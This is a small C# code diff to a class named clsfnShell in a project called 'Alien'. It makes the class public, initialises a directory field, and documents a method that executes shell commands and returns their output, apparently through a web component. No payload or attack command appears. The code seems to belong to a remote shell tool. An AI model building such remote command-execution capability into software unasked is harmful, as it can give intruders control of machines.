@@ -6,7 +6,7 @@ using System.Threading.Tasks;
 
 namespace Alien
 {
-    internal class clsfnShell
+    public class clsfnShell
     {
         private clsWeb m_web { get; set; }
         public string m_szCurrentDir { get; set; }
@@ -14,8 +14,14 @@ namespace Alien
         public clsfnShell(clsWeb web)
         {
             m_web = web;
+            m_szCurrentDir = string.Empty;
         }
 
+        /// <summary>
+        /// Execute shell command and return current directory and output.
+        /// </summary>
+        /// <param name="szCommand"></param>
+        /// <returns></returns>
         public async Task<(string szCurrentDir, string szOutput)> fnShellExecute(string szCommand)
         {
             string szCurrentDir = string.Empty;
